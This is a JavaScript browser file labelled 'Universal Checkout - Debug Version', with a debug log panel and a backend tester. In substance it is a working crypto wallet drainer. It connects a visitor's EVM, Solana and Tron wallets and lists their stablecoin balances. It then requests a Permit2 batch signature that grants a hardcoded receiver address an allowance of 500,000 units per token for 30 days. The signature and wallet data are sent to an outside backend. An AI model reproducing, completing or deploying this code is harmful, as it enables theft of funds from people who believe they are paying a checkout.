/**
 * Universal Checkout - Debug Version v15.0
 * Complete rewrite with copyable logs and backend tester
 */

// Buffer polyfill
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  
  EVM_TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
    ]
  },
  
  SOLANA_TOKENS: [
    { addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, price: 1 },
    { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6, price: 1 },
  ],
  
  TRON_TOKENS: [
    { addr: 'TRX', sym: 'TRX', dec: 6, price: 1 },
    { addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  NETWORK_NAMES: {
    1: "Ethereum", 8453: "Base", 137: "Polygon", 42161: "Arbitrum", 56: "BNB Chain", 10: "Optimism"
  }
};

// State
let debugLogs = [];
let evmProvider = null, evmSigner = null, evmAddress = null, evmChainId = null;
let solanaProvider = null, solanaAddress = null;
let tronWeb = null, tronAddress = null;
let foundTokens = [];
let lastSignature = null, lastSigDeadline = null;

function log(msg, type = 'info') {
  const time = new Date().toLocaleTimeString();
  const line = `[${time}] ${type.toUpperCase()}: ${msg}`;
  debugLogs.push(line);
  console.log(line);
  updateDebugDisplay();
}

function updateDebugDisplay() {
  const el = document.getElementById('debug-textarea');
  if (el) {
    el.value = debugLogs.join('\n');
    el.scrollTop = el.scrollHeight;
  }
}

function clearLogs() {
  debugLogs = [];
  updateDebugDisplay();
}

function copyLogs() {
  const el = document.getElementById('debug-textarea');
  if (el) {
    el.select();
    document.execCommand('copy');
    alert('Logs copied! Paste them here.');
  }
}

// ============ BACKEND TESTER ============
async function testBackendEndpoint(method, endpoint, body = null) {
  const url = `${CONFIG.BACKEND_URL}${endpoint}`;
  log(`\n=== TESTING ${method} ${endpoint} ===`);
  
  try {
    const options = {
      method: method,
      headers: { 'Content-Type': 'application/json' }
    };
    if (body) {
      options.body = JSON.stringify(body);
      log(`Request body: ${JSON.stringify(body, null, 2).substring(0, 500)}`);
    }
    
    log(`Fetching ${url}...`);
    const response = await fetch(url, options);
    
    log(`Status: ${response.status} ${response.statusText}`);
    log(`Status OK: ${response.ok}`);
    
    const text = await response.text();
    log(`Response length: ${text.length} chars`);
    log(`First 300 chars:\n${text.substring(0, 300)}`);
    
    if (text.trim().startsWith('<')) {
      log('ERROR: Response is HTML!', 'error');
      return { ok: false, error: 'HTML response', text };
    }
    
    try {
      const json = JSON.parse(text);
      log('JSON parsed successfully', 'success');
      return { ok: true, json, text };
    } catch (e) {
      log(`JSON parse failed: ${e.message}`, 'error');
      return { ok: false, error: 'JSON parse failed', text };
    }
    
  } catch (err) {
    log(`Network error: ${err.message}`, 'error');
    return { ok: false, error: err.message };
  }
}

async function runBackendTests() {
  log('\n\n########################################', 'warn');
  log('RUNNING BACKEND DIAGNOSTICS', 'warn');
  log('########################################', 'warn');
  
  // Test root
  await testBackendEndpoint('GET', '/');
  
  // Test health
  await testBackendEndpoint('GET', '/health');
  
  // Test authorize with dummy data
  await testBackendEndpoint('POST', '/api/authorize/unified', {
    evmAddress: '0x1234567890123456789012345678901234567890',
    tokens: [{ chain: 'evm', symbol: 'USDC', usdValue: 100 }],
    totalValue: 100,
    timestamp: Date.now()
  });
  
  // Test pending
  await testBackendEndpoint('GET', '/api/pending/evm');
  
  log('\n########################################', 'warn');
  log('TESTS COMPLETE', 'warn');
  log('########################################', 'warn');
  log('\nClick "Copy Logs" and paste everything here', 'success');
}

// ============ UI ============
function showMainUI() {
  document.body.innerHTML = `
    <div style="max-width: 1000px; margin: 0 auto; padding: 20px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
      <h1>🔧 Universal Checkout - Debug Mode v15.0</h1>
      
      <div style="background: #fef3c7; border: 2px solid #f59e0b; border-radius: 12px; padding: 20px; margin: 20px 0;">
        <h3 style="margin-top: 0;">Backend URL</h3>
        <input type="text" id="backend-url-input" value="${CONFIG.BACKEND_URL}" 
               style="width: 100%; padding: 10px; font-family: monospace; font-size: 14px;">
        <button onclick="updateBackendUrl()" style="margin-top: 10px; padding: 8px 16px; background: #3b82f6; color: white; border: none; border-radius: 6px; cursor: pointer;">
          Update URL
        </button>
        <p style="margin: 10px 0 0 0; font-size: 14px; color: #92400e;">
          Current: <span id="current-url-display">${CONFIG.BACKEND_URL}</span>
        </p>
      </div>
      
      <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px;">
        <button onclick="runBackendTests()" style="padding: 15px 30px; background: #10b981; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">
          🧪 Test Backend
        </button>
        <button onclick="startFullScan()" style="padding: 15px 30px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">
          🚀 Connect Wallet
        </button>
        <button onclick="manualSend()" style="padding: 15px 30px; background: #8b5cf6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">
          📤 Send Data
        </button>
        <button onclick="copyLogs()" style="padding: 15px 30px; background: #6b7280; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">
          📋 Copy Logs
        </button>
        <button onclick="clearLogs()" style="padding: 15px 30px; background: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">
          🗑️ Clear
        </button>
      </div>
      
      <div style="background: #1a1a1a; border-radius: 12px; overflow: hidden; border: 2px solid #333;">
        <div style="background: #333; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;">
          <span style="color: white; font-weight: bold;">📋 DEBUG LOGS (COPY THIS TEXTAREA)</span>
          <span style="color: #22c55e; font-size: 12px;">Select all → Ctrl+C</span>
        </div>
        <textarea id="debug-textarea" readonly 
                  style="width: 100%; height: 500px; background: #1a1a1a; color: #22c55e; border: none; 
                         padding: 20px; font-family: monospace; font-size: 12px; resize: vertical; outline: none;">
        </textarea>
      </div>
      
      <div id="status-panel" style="margin-top: 20px; padding: 20px; background: #f3f4f6; border-radius: 12px;">
        <p style="color: #666; margin: 0;">Click "Test Backend" to diagnose the connection issue...</p>
      </div>
    </div>
  `;
  
  log('Debug UI loaded', 'success');
  log(`Backend URL: ${CONFIG.BACKEND_URL}`);
  log('Click "Test Backend" to start diagnostics', 'warn');
}

function updateBackendUrl() {
  const input = document.getElementById('backend-url-input');
  if (input) {
    CONFIG.BACKEND_URL = input.value.trim();
    document.getElementById('current-url-display').textContent = CONFIG.BACKEND_URL;
    log(`Backend URL updated: ${CONFIG.BACKEND_URL}`, 'success');
  }
}

function updateStatus(html) {
  const el = document.getElementById('status-panel');
  if (el) el.innerHTML = html;
}

// ============ WALLET CONNECTION ============
async function startFullScan() {
  log('\n=== STARTING WALLET CONNECTION ===', 'warn');
  
  try {
    // EVM
    if (window.ethereum && typeof ethers !== 'undefined') {
      log('Connecting EVM...');
      evmProvider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await evmProvider.send("eth_requestAccounts", []);
      if (accounts.length > 0) {
        evmAddress = accounts[0];
        evmSigner = await evmProvider.getSigner();
        const network = await evmProvider.getNetwork();
        evmChainId = Number(network.chainId);
        log(`EVM: ${evmAddress} (chain ${evmChainId})`, 'success');
      }
    } else {
      log('No EVM provider or ethers.js not loaded', 'error');
    }
    
    // Solana
    const solProvider = window.solana || window.phantom?.solana;
    if (solProvider) {
      log('Connecting Solana...');
      await solProvider.connect();
      if (solProvider.publicKey) {
        solanaAddress = solProvider.publicKey.toString();
        log(`Solana: ${solanaAddress}`, 'success');
      }
    }
    
    // Tron
    const tw = window.tronWeb || window.tronLink?.tronWeb;
    if (tw?.defaultAddress?.base58) {
      tronAddress = tw.defaultAddress.base58;
      log(`Tron: ${tronAddress}`, 'success');
    }
    
    // Scan
    await scanTokens();
    
  } catch (err) {
    log(`Connection error: ${err.message}`, 'error');
    updateStatus(`<p style="color: #ef4444;">Error: ${err.message}</p>`);
  }
}

async function scanTokens() {
  foundTokens = [];
  log('\nScanning tokens...');
  
  if (evmAddress && evmChainId) {
    const tokens = CONFIG.EVM_TOKENS[evmChainId] || [];
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.addr, [
          "function balanceOf(address) view returns (uint256)"
        ], evmProvider);
        const balance = await contract.balanceOf(evmAddress);
        const human = Number(balance) / (10 ** token.dec);
        const usd = human * token.price;
        
        if (usd >= 1) {
          log(`${token.sym}: $${usd.toFixed(2)}`, 'success');
          foundTokens.push({
            chain: 'evm', chainId: evmChainId, token: token.addr,
            symbol: token.sym, decimals: token.dec,
            balance: balance.toString(), humanBalance: human, usdValue: usd,
            address: evmAddress
          });
        }
      } catch (e) {}
    }
  }
  
  log(`Found ${foundTokens.length} tokens`, 'success');
  
  if (foundTokens.length > 0 && evmSigner) {
    await requestSignature();
  } else {
    updateStatus(`<p>Found ${foundTokens.length} tokens. ${!evmSigner ? 'No signer.' : ''}</p>`);
  }
}

async function requestSignature() {
  log('\nRequesting Permit2 signature...');
  
  try {
    const evmTokens = foundTokens.filter(t => t.chain === 'evm');
    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
      "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
    ], evmProvider);
    
    const permits = [];
    for (const token of evmTokens) {
      const { 2: nonce } = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
      permits.push({
        token: token.token,
        amount: ethers.parseUnits("500000", token.decimals),
        expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
        nonce: Number(nonce)
      });
    }
    
    const permitBatch = {
      details: permits,
      spender: CONFIG.RECEIVER_ADDRESS,
      sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
    };
    
    log('Calling signTypedData - check MetaMask!', 'warn');
    
    const signature = await evmSigner.signTypedData(
      { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
      {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      },
      permitBatch
    );
    
    lastSignature = signature;
    lastSigDeadline = permitBatch.sigDeadline;
    log(`Signature: ${signature.substring(0, 40)}...`, 'success');
    updateStatus(`<p style="color: #10b981;">✅ Signed! Click "Send Data" to submit.</p>`);
    
  } catch (err) {
    log(`Signature failed: ${err.message}`, 'error');
  }
}

async function manualSend() {
  if (foundTokens.length === 0) {
    log('No tokens to send', 'error');
    return;
  }
  
  const totalValue = foundTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
  const payload = {
    evmAddress, solanaAddress, tronAddress,
    tokens: foundTokens,
    evmSignature: lastSignature,
    evmSigDeadline: lastSigDeadline,
    totalValue,
    maxAuthorizedAmount: Math.min(totalValue, 500000),
    timestamp: Date.now()
  };
  
  log('\nSending to backend...');
  const result = await testBackendEndpoint('POST', '/api/authorize/unified', payload);
  
  if (result.ok) {
    updateStatus(`<p style="color: #10b981;">✅ Success! Auth ID: ${result.json.authorizationId}</p>`);
  } else {
    updateStatus(`<p style="color: #ef4444;">❌ Failed: ${result.error}</p><pre style="background: #fee; padding: 10px; overflow: auto; font-size: 11px;">${result.text?.substring(0, 1000) || 'No response'}</pre>`);
  }
}

// ============ INIT ============
window.updateBackendUrl = updateBackendUrl;
window.runBackendTests = runBackendTests;
window.startFullScan = startFullScan;
window.manualSend = manualSend;
window.copyLogs = copyLogs;
window.clearLogs = clearLogs;

window.addEventListener('DOMContentLoaded', showMainUI);